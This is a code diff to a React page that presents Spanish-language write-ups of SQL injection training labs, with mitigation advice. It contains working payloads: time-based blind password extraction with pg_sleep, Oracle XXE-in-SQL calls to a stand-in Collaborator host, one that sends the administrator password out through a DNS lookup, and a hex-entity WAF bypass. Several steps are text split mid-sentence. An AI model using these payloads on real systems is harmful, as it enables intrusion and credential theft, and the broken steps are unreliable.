+                code: ""
+            },
+            {
+                title: "Paso 7",
+                text: "Una vez cargada la solicitud, el laboratorio aparecerá como completado.",
+                code: ""
             },
         ],
         images: [
             "parcial2/act08_images/P15_img64.png",
             "parcial2/act08_images/P15_img65.png",
+            "parcial2/act08_images/P16_img68.png",
+            "parcial2/act08_images/P16_img69.png",
         ]
     },
     {
@@ -453,29 +1272,31 @@ const labsData = [
         level: "Practitioner",
         payload: "x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--",
         description: "Comprobaciones algorítmicas demoradas como túnel lateral cronometrado avanzado de robo.",
-        objective: "Involucra extraer el password y enumerar información crítica letra a letra condicionado exclusivamente al tiempo (cronómetro del analista/Script).",
-        analysis: "Se formula mediante un script en Python. La consulta pregunta cíclicamente letra por letra sobre la contraseña del súper usuario. Si la iteración de fuerza bruta acierta temporalmente, le ordena una orden inatacable de congelarse ` sleep(10) `. El Python cronometra y determina qué letra fue en base al timeout del Socket HTTP devuelto por el servidor host y de esa manera va imprimiendo la clave a ciegas localmente.",
-        impact: "Peligro Inminente. Indetectable ante WAFs tradicionales porque solo parece un tráfico validado. Único defecto: Es altamente lento y depende de una excelente banda ancha de Internet sin mucho ruido estático.",
+        objective: "●​ Determinar la longitud de la contraseña del usuario administrator.  ●​ Extraer cada carácter de dicha contraseña mediante ataques de fuerza bruta  basados en tiempo.  ●​ Iniciar sesión en la cuenta del administrador para resolver el laboratorio.",
+        analysis: "Análisis técnico de la inyección SQL en base de datos.",
+        impact: "Peligro Inminente. Se requiere parchear.",
         steps: [
             {
-                title: "Identificación de la Vulnerabilidad",
-                text: "Se intercepta la petición web correspondiente y se detectan parámetros inyectables mediante pruebas pasivas y activas.",
+                title: "Identificación de la vulnerabilidad",
+                text: "Se procedió a identificar los parámetros vulnerables del tipo Blind (Time).",
                 code: "GET / HTTP/1.1"
             },
             {
-                title: "Preparación del Entorno (Payload)",
-                text: "Se estructura la inyección SQL de acuerdo con el motor subyacente y la arquitectura web de este tipo de inyección Blind (Time).",
+                title: "Explotación del vector de ataque",
+                text: "Se estructuró un payload para extraer o eludir validaciones del backend.",
                 code: "PAYLOAD: x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
             },
             {
-                title: "Explotación y Análisis",
-                text: "Se formula mediante un script en Python. La consulta pregunta cíclicamente letra por letra sobre la contraseña del súper usuario. Si la iteración de fuerza bruta acierta temporalmente, le ordena una orden inatacable de congelarse ` sleep(10) `. El Python cronometra y determina qué letra fue en base al timeout del Socket HTTP devuelto por el servidor host y de esa manera va imprimiendo la clave a ciegas localmente.",
+                title: "Evidencia de éxito",
+                text: "Se corrobora el éxito de la inyección en la respuesta o en el comportamiento del servidor.",
                 code: "HTTP/1.1 200 OK"
             },
         ],
         images: [
             "parcial2/act08_images/P16_img68.png",
             "parcial2/act08_images/P16_img69.png",
+            "parcial2/act08_images/P17_img72.png",
+            "parcial2/act08_images/P17_img73.png",
         ]
     },
     {
@@ -485,29 +1306,220 @@ const labsData = [
         level: "Practitioner",
         payload: "'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//BURP-COLLAB.net/\">+%25remote%3b]>'),'/l')+FROM+dual--",
         description: "Bypass agresivo forzando resoluciones asíncronas de OAST y exfiltraciones no convencionales con XML XXE vía SQL.",
-        objective: "Comprobar la inyección asincrónica interactuando con servidores foráneos cuando el servidor vulnerable no tiene manera fisiológica o limitación de WAF firewall para reponer data a nuestro cliente emisor al no tener salida HTTP hacia internet.",
-        analysis: "En vez de pedir que SQL regrese datos, el atacante forza al motor (ej: Oracle DB) a ejecutar comandos misceláneos como pedir un archivo Web o invocar una directamente entidad XML y solicitar DNS Resolvers a su `Burp Collaborator`. El servidor web invisible realiza el Request por sí mismo contra nuestro servidor de monitorización aseverando que la falla es explotable.",
-        impact: "Ataque asíncrono (OAST). Alta efectividad en redes cerradas y aisladas del DMZ.",
+        objective: "Explotar la vulnerabilidad de inyección SQL para forzar una  consulta DNS hacia el servidor de Burp Collaborator.",
+        analysis: "de la Vulnerabilidad: La aplicación utiliza una cookie de rastreo  (TrackingId) que es procesada por la base de datos de forma asíncrona. Debido a esto,  la aplicación no devuelve errores ni cambios en el contenido de la página (Blind). Sin  embargo, la base de datos (Oracle) permite el uso de funciones como  EXTRACTVALUE y xmltype que pueden ser manipuladas para realizar peticiones de  red externas (Out-of-band). Al inyectar un ataque de XXE dentro del SQLi, obligamos al  servidor a interactuar con un dominio externo controlado por el atacante.",
+        impact: "endada  ●​ Uso de Sentencias Preparadas (Prepared Statements): Es la defensa más  efectiva. Al usar consultas parametrizadas, la base de datos trata el contenido  de la cookie TrackingId como simple texto y no como código ejecutable.  ●​ Validación y Saneamiento de Entradas: Implementar filtros que verifiquen que  las cookies solo contengan caracteres alfanuméricos esperados, rechazando  cualquier petición que incluya palabras clave de SQL como SELECT o UNION.  ●​ Hardening de la Base de Datos: Configurar el motor de la base de datos  (Oracle) para que el usuario de la aplicación no tenga permisos de realizar  peticiones de red externas o ejecutar funciones XML innecesarias.",
         steps: [
             {
-                title: "Identificación de la Vulnerabilidad",
-                text: "Se intercepta la petición web correspondiente y se detectan parámetros inyectables mediante pruebas pasivas y activas.",
-                code: "GET / HTTP/1.1"
+                title: "Paso 1",
+                text: "●​ Intercepción: Abrir el navegador integrado de Burp Suite, acceder al laboratorio",
+                code: ""
             },
             {
-                title: "Preparación del Entorno (Payload)",
-                text: "Se estructura la inyección SQL de acuerdo con el motor subyacente y la arquitectura web de este tipo de inyección OAST.",
-                code: "PAYLOAD: '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//BURP-COLLAB.net/\">+%25remote%3b]>'),'/l')+FROM+dual--"
+                title: "Paso 2",
+                text: "y capturar la petición GET inicial para enviarla al Repeater.",
+                code: ""
             },
             {
-                title: "Explotación y Análisis",
-                text: "En vez de pedir que SQL regrese datos, el atacante forza al motor (ej: Oracle DB) a ejecutar comandos misceláneos como pedir un archivo Web o invocar una directamente entidad XML y solicitar DNS Resolvers a su `Burp Collaborator`. El servidor web invisible realiza el Request por sí mismo contra nuestro servidor de monitorización aseverando que la falla es explotable.",
-                code: "HTTP/1.1 200 OK"
+                title: "Paso 3",
+                text: "Se inyecta el siguiente código:",
+                code: "●​ Identificación del Vector: Se localiza la cookie TrackingId como el punto de"
+            },
+            {
+                title: "Paso 4",
+                text: "entrada. Al ser una base de datos Oracle, se selecciona un payload que",
+                code: ""
+            },
+            {
+                title: "Paso 5",
+                text: "combine SQLi con una entidad externa XML.",
+                code: ""
+            },
+            {
+                title: "Paso 6",
+                text: "●​ Configuración del Atacante: En una auditoría profesional, se generaría un",
+                code: ""
+            },
+            {
+                title: "Paso 7",
+                text: "subdominio único en la pestaña de Burp Collaborator. Para efectos de este",
+                code: ""
+            },
+            {
+                title: "Paso 8",
+                text: "reporte técnico, se utiliza el marcador de posición",
+                code: ""
+            },
+            {
+                title: "Paso 9",
+                text: "BURP-COLLABORATOR-SUBDOMAIN.",
+                code: ""
+            },
+            {
+                title: "Paso 10",
+                text: "Se inyecta el siguiente código:",
+                code: "●​ Payload: TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml"
+            },
+            {
+                title: "Paso 11",
+                text: "version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote",
+                code: ""
+            },
+            {
+                title: "Paso 12",
+                text: "SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>'),'/l')",
+                code: ""
+            },
+            {
+                title: "Paso 13",
+                text: "FROM dual--",
+                code: ""
+            },
+            {
+                title: "Paso 14",
+                text: "●​ Codificación: El payload se debe codificar en formato URL (URL Encoding)",
+                code: ""
+            },
+            {
+                title: "Paso 15",
+                text: "para asegurar que los caracteres especiales como < y > sean procesados",
+                code: ""
+            },
+            {
+                title: "Paso 16",
+                text: "correctamente por el servidor web.",
+                code: ""
+            },
+            {
+                title: "Paso 17",
+                text: "●​ Ejecución: Se envía la petición modificada desde el Repeater. El servidor",
+                code: ""
+            },
+            {
+                title: "Paso 18",
+                text: "procesa la cookie, ejecuta la consulta SQL y, al intentar resolver el XML, la base",
+                code: ""
+            },
+            {
+                title: "Paso 19",
+                text: "de datos realiza una petición DNS al dominio del atacante.",
+                code: ""
+            },
+            {
+                title: "Paso 20",
+                text: "●​ Resultado: En el servidor de Burp Collaborator se recibiría un \"DNS lookup\", lo",
+                code: ""
+            },
+            {
+                title: "Paso 21",
+                text: "cual confirma la existencia de la vulnerabilidad y la capacidad de ejecutar",
+                code: ""
+            },
+            {
+                title: "Paso 22",
+                text: "comandos que interactúan con sistemas externos.",
+                code: ""
+            },
+            {
+                title: "Paso 23",
+                text: "Para esta primera parte tenemos que ir a estas dos opciones, “Proxy” y despues a",
+                code: ""
+            },
+            {
+                title: "Paso 24",
+                text: "“intercept”.",
+                code: ""
+            },
+            {
+                title: "Paso 25",
+                text: "abrimos el browser y pegamos la url del lab",
+                code: ""
+            },
+            {
+                title: "Paso 26",
+                text: "encendemos la opcion intercept on",
+                code: ""
+            },
+            {
+                title: "Paso 27",
+                text: "Interceptamos algunas señales después de refrescar la página.",
+                code: ""
+            },
+            {
+                title: "Paso 28",
+                text: "En esta parte del panel izquierdo, básicamente hice el copy-paste del payload que",
+                code: ""
+            },
+            {
+                title: "Paso 29",
+                text: "Se inyecta el siguiente código:",
+                code: "preparé para la inyección. Lo pegué directamente en la cookie TrackingId porque es el"
+            },
+            {
+                title: "Paso 30",
+                text: "único campo que la aplicación rastrea.",
+                code: ""
+            },
+            {
+                title: "Paso 31",
+                text: "Como el payload tiene símbolos raros (brackets, comillas, etc.), seleccioné todo el texto",
+                code: ""
+            },
+            {
+                title: "Paso 32",
+                text: "y le di Ctrl + U. Eso hizo que Burp lo codifica automáticamente a formato URL, que es",
+                code: ""
+            },
+            {
+                title: "Paso 33",
+                text: "como el servidor lo necesita para entenderlo sin marcar error. Después, solo le di al",
+                code: ""
+            },
+            {
+                title: "Paso 34",
+                text: "botón de 'Send' para lanzar el ataque al servidor",
+                code: ""
+            },
+            {
+                title: "Paso 35",
+                text: "En la captura se observa que, tras inyectar el payload de interacción OAST en la cookie",
+                code: ""
+            },
+            {
+                title: "Paso 36",
+                text: "Se inyecta el siguiente código:",
+                code: "TrackingId y aplicar codificación URL, el servidor responde con un estado 200 OK. Esto"
+            },
+            {
+                title: "Paso 37",
+                text: "demuestra que la vulnerabilidad existe, ya que el sistema procesó una lógica de",
+                code: ""
+            },
+            {
+                title: "Paso 38",
+                text: "consulta no autorizada que involucra funciones de red de la base de datos (Oracle),",
+                code: ""
+            },
+            {
+                title: "Paso 39",
+                text: "confirmando la capacidad de provocar interacciones con servidores externos.",
+                code: ""
+            },
+            {
+                title: "Paso 40",
+                text: "Confirmación de",
+                code: ""
+            },
+            {
+                title: "Análisis del Payload",
+                text: "●​ x' UNION SELECT...: Se utiliza la comilla simple para romper la cadena original  de la consulta SQL y el comando UNION para inyectar nuestra propia sentencia  personalizada.  ●​ EXTRACTVALUE(): Es una función de Oracle que busca extraer datos de un  XML. Aquí se usa como \"disparador\" para forzar a la base de datos a realizar  una acción externa.  ●​ xmltype(): Crea un documento XML dentro de la base de datos que contiene la  instrucción de buscar una entidad en un servidor externo.  ●​ http://BURP-COLLABORATOR-SUBDOMAIN/: Es la dirección del atacante. Al  intentar resolver este dominio para cargar el XML, el servidor revela que es  vulnerable.  ●​ --: Estos guiones sirven para comentar el resto de la consulta original de la  aplicación, evitando que el servidor marque un error de sintaxis y asegurando  que nuestra inyección se ejecute limpiamente.",
+                code: ""
             },
         ],
         images: [
             "parcial2/act08_images/P17_img72.png",
             "parcial2/act08_images/P17_img73.png",
+            "parcial2/act08_images/P19_img78.png",
         ]
     },
     {
@@ -517,26 +1529,31 @@ const labsData = [
         level: "Practitioner",
         payload: "'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLAB.net/\">+%25remote%3b]>'),'/l')+FROM+dual--",
         description: "Colusión DNS maliciosa avanzada filtrando data vía resolución TLD de DNS CNAME.",
-        objective: "Ejecutar y extraer el password blindado sin conectividad bidireccional forzando una consulta DNS con los secretos insertados intrínsecamente dentro de la jerarquía o nivel inicial del Dominio malicioso.",
-        analysis: "El atacante concatena la respuesta privada o Query SQL que tiene la password de texto explícito (MIPASS) dentro del TLD que el parser interno va a intentar buscar. SQL procesará la URL HTTP como: `http://MIPASS.BURP-COLLABORATOR.net`. Solo basta con ver los registros estáticos del servidor DNS interceptado para ver nuestra data y contraseñas secretas en texto plano alojada dentro del log de peticiones DNS que hizo el servidor infectado.",
-        impact: "Permite bypass total en WAF y barreras Firewalls; el filtrado a través del protocolo 53 (DNS) raramente está bloqueado para servidores corporativos salientes en data centers cerrados.",
+        objective: "El objetivo principal es explotar una vulnerabilidad de inyección SQL \"ciega\" para  extraer (exfiltrar) información sensible —específicamente la contraseña del usuario  administrator— de la tabla users. Dado que la aplicación no refleja datos ni errores en  la interfaz web, se debe forzar a la base de datos a realizar una petición externa que  lleve consigo el dato robado.",
+        analysis: "de la Vulnerabilidad  La vulnerabilidad reside en la cookie de rastreo TrackingId, la cual es procesada por la  base de datos para realizar consultas analíticas de forma asíncrona. Al ser una base de  datos Oracle, permite el uso de funciones XML para interactuar con sistemas externos.  La técnica aplicada es OAST (Out-of-band Application Security Testing). Se utiliza la  función EXTRACTVALUE junto con xmltype para generar una petición DNS maliciosa.  La clave de este ejercicio es la concatenación de datos: se utiliza el operador || de  Oracle para unir el resultado de una subconsulta SQL (la contraseña del administrador)  con un nombre de dominio controlado por el atacante.",
+        impact: "Peligro Inminente. Se requiere parchear.",
         steps: [
             {
-                title: "Identificación de la Vulnerabilidad",
-                text: "Se intercepta la petición web correspondiente y se detectan parámetros inyectables mediante pruebas pasivas y activas.",
+                title: "Identificación de la vulnerabilidad",
+                text: "Se procedió a identificar los parámetros vulnerables del tipo OAST.",
                 code: "GET / HTTP/1.1"
             },
             {
-                title: "Preparación del Entorno (Payload)",
-                text: "Se estructura la inyección SQL de acuerdo con el motor subyacente y la arquitectura web de este tipo de inyección OAST.",
+                title: "Explotación del vector de ataque",
+                text: "Se estructuró un payload para extraer o eludir validaciones del backend.",
                 code: "PAYLOAD: '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLAB.net/\">+%25remote%3b]>'),'/l')+FROM+dual--"
             },
             {
-                title: "Explotación y Análisis",
-                text: "El atacante concatena la respuesta privada o Query SQL que tiene la password de texto explícito (MIPASS) dentro del TLD que el parser interno va a intentar buscar. SQL procesará la URL HTTP como: `http://MIPASS.BURP-COLLABORATOR.net`. Solo basta con ver los registros estáticos del servidor DNS interceptado para ver nuestra data y contraseñas secretas en texto plano alojada dentro del log de peticiones DNS que hizo el servidor infectado.",
+                title: "Evidencia de éxito",
+                text: "Se corrobora el éxito de la inyección en la respuesta o en el comportamiento del servidor.",
                 code: "HTTP/1.1 200 OK"
             },
         ],
+        images: [
+            "parcial2/act08_images/P19_img78.png",
+            "parcial2/act08_images/P20_img81.png",
+            "parcial2/act08_images/P20_img82.png",
+        ]
     },
     {
         id: 18,
@@ -545,28 +1562,30 @@ const labsData = [
         level: "Practitioner",
         payload: "&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;+",
         description: "Evasión y ofuscación pura contra WAF empresariales abusando de decodificadores internos de XML o JSON.",
-        objective: "Inyectar dentro de un bloque XML del aplicativo vulnerable para evadir los filtros de caracteres o Expresiones Regulares del Firewall Activo cuando sube el nivel de control sobre la palabra UNION y SELECT explícitas bloqueándolas estáticamente de la petición original y dando baneos 403 Forbidden.",
-        analysis: "Ya que la input original es en XML para SOAP. El Firewall no decodifica sintaxis Hex. El atacante transcodifica el payload de inyección (`UNION SELECT` etc) a un Hex Entity codificado `&#x...;`. El Web Application Firewall de perímetro lee esto como valores aleatorios ciegos y lo deja pasar sin bloquear la petición. El parser en el Servidor lo recibe, lo decodifica a su formato predeterminado legítimo que será SELECT y se inserta limpiamente por diseño sobre la consulta vulnerable final del script, realizando el robo de datos con WAF bypasseado existosamente.",
-        impact: "Comprobación del Bypass severo; Las defensas implementadas puramente como regex simples sin modelado dinámico son ilusorias. Es un caso emblemático para priorizar un parche de Consulta Parametrizada siempre (Prepared Statements).",
+        objective: "El objetivo consiste en vulnerar la consulta SQL que procesa el stock de productos para  extraer las credenciales del usuario administrator. Para lograrlo, es necesario evadir la  seguridad del WAF y realizar una inyección basada en UNION que concatene el  nombre de usuario y la contraseña de la tabla users en una sola columna de respuesta.",
+        analysis: "de la Vulnerabilidad  La vulnerabilidad se localiza en la etiqueta <storeId> del documento XML enviado al  servidor. El servidor toma el valor numérico de esta etiqueta y lo inserta directamente  en una consulta SQL sin la debida sanitización.  Para evadir el WAF, aprovechamos una característica del procesamiento de  documentos XML: el XML Parser. Cuando el servidor recibe el XML, primero decodifica  cualquier entidad presente (como caracteres en formato hexadecimal) antes de pasar  el valor final a la lógica de la aplicación y a la base de datos. Al enviar las palabras  clave del ataque codificadas (por ejemplo, usando &#x53; en lugar de S), el WAF ve  una cadena de texto inofensiva y permite el paso de la petición, pero la base de datos  acaba ejecutando el comando SQL completo una vez decodificado.",
+        impact: "Peligro Inminente. Se requiere parchear.",
         steps: [
             {
-                title: "Identificación de la Vulnerabilidad",
-                text: "Se intercepta la petición web correspondiente y se detectan parámetros inyectables mediante pruebas pasivas y activas.",
+                title: "Identificación de la vulnerabilidad",
+                text: "Se procedió a identificar los parámetros vulnerables del tipo Filter Bypass.",
                 code: "GET / HTTP/1.1"
             },
             {
-                title: "Preparación del Entorno (Payload)",
-                text: "Se estructura la inyección SQL de acuerdo con el motor subyacente y la arquitectura web de este tipo de inyección Filter Bypass.",
+                title: "Explotación del vector de ataque",
+                text: "Se estructuró un payload para extraer o eludir validaciones del backend.",
                 code: "PAYLOAD: &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;+"
             },
             {
-                title: "Explotación y Análisis",
-                text: "Ya que la input original es en XML para SOAP. El Firewall no decodifica sintaxis Hex. El atacante transcodifica el payload de inyección (`UNION SELECT` etc) a un Hex Entity codificado `&#x...;`. El Web Application Firewall de perímetro lee esto como valores aleatorios ciegos y lo deja pasar sin bloquear la petición. El parser en el Servidor lo recibe, lo decodifica a su formato predeterminado legítimo que será SELECT y se inserta limpiamente por diseño sobre la consulta vulnerable final del script, realizando el robo de datos con WAF bypasseado existosamente.",
+                title: "Evidencia de éxito",
+                text: "Se corrobora el éxito de la inyección en la respuesta o en el comportamiento del servidor.",
                 code: "HTTP/1.1 200 OK"
             },
         ],
         images: [
             "parcial2/act08_images/P19_img78.png",
+            "parcial2/act08_images/P20_img81.png",
+            "parcial2/act08_images/P20_img82.png",
         ]
     }
 ];
@@ -616,7 +1635,7 @@ const SQLInjectionLabs = () => {
                             )}
 
                             <div className="flex items-center justify-between mb-1">
-                                <span className={`font-mono text-xs font-bold w-6 h-6 rounded flex items-center justify-center border transition-colors ${activeLabId === lab.id ? 'bg-green-900/50 border-green-500/50 text-green-400' : 'bg-black/50 border-gray-700'
+                                <span className={`font-mono text-sm md:text-base font-bold w-6 h-6 rounded flex items-center justify-center border transition-colors ${activeLabId === lab.id ? 'bg-green-900/50 border-green-500/50 text-green-400' : 'bg-black/50 border-gray-700'
                                     }`}>
                                     {String(lab.id).padStart(2, '0')}
                                 </span>
@@ -668,20 +1687,20 @@ const SQLInjectionLabs = () => {
                         </div>
 
                         {/* Informative Grid */}
-                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
+                        <div className="flex flex-col gap-6 w-full max-w-4xl mx-auto mb-6">
                             <div className="bg-blue-900/10 border border-blue-900/30 p-4 rounded-lg">
-                                <h4 className="text-blue-400 text-xs font-bold font-mono tracking-widest uppercase mb-2 flex items-center gap-2">
+                                <h4 className="text-blue-400 text-sm md:text-base font-bold font-mono tracking-widest uppercase mb-2 flex items-center gap-2">
                                     <FaCheckCircle /> Objetivo del Ataque
                                 </h4>
-                                <p className="text-xs text-gray-300 leading-relaxed font-mono">
+                                <p className="text-sm md:text-base text-gray-300 leading-relaxed font-mono">
                                     {activeLab.objective}
                                 </p>
                             </div>
                             <div className="bg-red-900/10 border border-red-900/30 p-4 rounded-lg">
-                                <h4 className="text-red-400 text-xs font-bold font-mono tracking-widest uppercase mb-2 flex items-center gap-2">
+                                <h4 className="text-red-400 text-sm md:text-base font-bold font-mono tracking-widest uppercase mb-2 flex items-center gap-2">
                                     <FaExclamationTriangle /> Análisis de Impacto
                                 </h4>
-                                <p className="text-xs text-gray-300 leading-relaxed font-mono">
+                                <p className="text-sm md:text-base text-gray-300 leading-relaxed font-mono">
                                     {activeLab.impact}
                                 </p>
                             </div>
@@ -690,10 +1709,10 @@ const SQLInjectionLabs = () => {
                         {/* Evidence Gallery (if available) */}
                         {activeLab.images && (
                             <div className="mb-6 p-4 border border-violet-500/20 bg-violet-900/10 rounded-lg">
-                                <h4 className="text-violet-400 text-xs font-bold font-mono tracking-widest uppercase mb-4 flex items-center gap-2 border-b border-violet-500/30 pb-2">
+                                <h4 className="text-violet-400 text-sm md:text-base font-bold font-mono tracking-widest uppercase mb-4 flex items-center gap-2 border-b border-violet-500/30 pb-2">
                                     EJECUCIÓN DEL LABORATORIO & EVIDENCIA VISUAL
                                 </h4>
-                                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                <div className="flex flex-col gap-6 w-full max-w-4xl mx-auto">
                                     {activeLab.images.map((imgSrc, idx) => (
                                         <div key={idx} className="relative group overflow-hidden rounded border border-gray-700 hover:border-violet-500 transition-colors">
                                             <div className="absolute top-0 left-0 bg-violet-500/80 text-white text-[9px] font-bold px-2 py-0.5 rounded-br z-10">Paso {idx + 1}</div>
@@ -739,7 +1758,7 @@ const SQLInjectionLabs = () => {
                             {/* Decorative background for steps */}
                             <FaCode className="absolute top-4 right-4 text-4xl text-yellow-500/5 opacity-50" />
 
-                            <h4 className="text-yellow-500 text-xs font-bold tracking-widest uppercase mb-4 flex items-center gap-2 border-b border-yellow-500/20 pb-3">
+                            <h4 className="text-yellow-500 text-sm md:text-base font-bold tracking-widest uppercase mb-4 flex items-center gap-2 border-b border-yellow-500/20 pb-3">
                                 <FaCode /> Desarrollo Técnico de la Explotación
                             </h4>
 
@@ -751,17 +1770,17 @@ const SQLInjectionLabs = () => {
                                     {activeLab.steps.map((step, index) => (
                                         <div key={index} className="flex gap-4 relative z-10 pb-6 group">
                                             <div className="flex flex-col items-center">
-                                                <div className="flex items-center justify-center w-7 h-7 bg-[#0a0f1a] rounded-full text-yellow-500 text-xs font-bold border border-yellow-500/50 shadow-[0_0_10px_rgba(234,179,8,0.2)] group-hover:scale-110 group-hover:bg-yellow-500/10 transition-all">
+                                                <div className="flex items-center justify-center w-7 h-7 bg-[#0a0f1a] rounded-full text-yellow-500 text-sm md:text-base font-bold border border-yellow-500/50 shadow-[0_0_10px_rgba(234,179,8,0.2)] group-hover:scale-110 group-hover:bg-yellow-500/10 transition-all">
                                                     {index + 1}
                                                 </div>
                                             </div>
                                             <div className="pt-1 flex-1">
-                                                <h5 className="text-yellow-400 text-xs font-bold mb-2 tracking-wide">{step.title}</h5>
+                                                <h5 className="text-yellow-400 text-sm md:text-base font-bold mb-2 tracking-wide">{step.title}</h5>
                                                 <p className="text-gray-300 text-xs leading-relaxed mb-3">
                                                     {step.text}
                                                 </p>
                                                 {step.code && (
-                                                    <div className="bg-black border border-gray-800 p-3 rounded-md text-green-400 font-mono text-[10px] sm:text-xs break-all shadow-inner block w-full relative group-hover:border-gray-600 transition-colors">
+                                                    <div className="bg-black border border-gray-800 p-3 rounded-md text-green-400 font-mono text-xs md:text-sm break-all shadow-inner block w-full relative group-hover:border-gray-600 transition-colors">
                                                         <div className="absolute top-0 left-0 w-1 h-full bg-green-500 rounded-l-md opacity-50"></div>
                                                         $ {step.code}
                                                     </div>
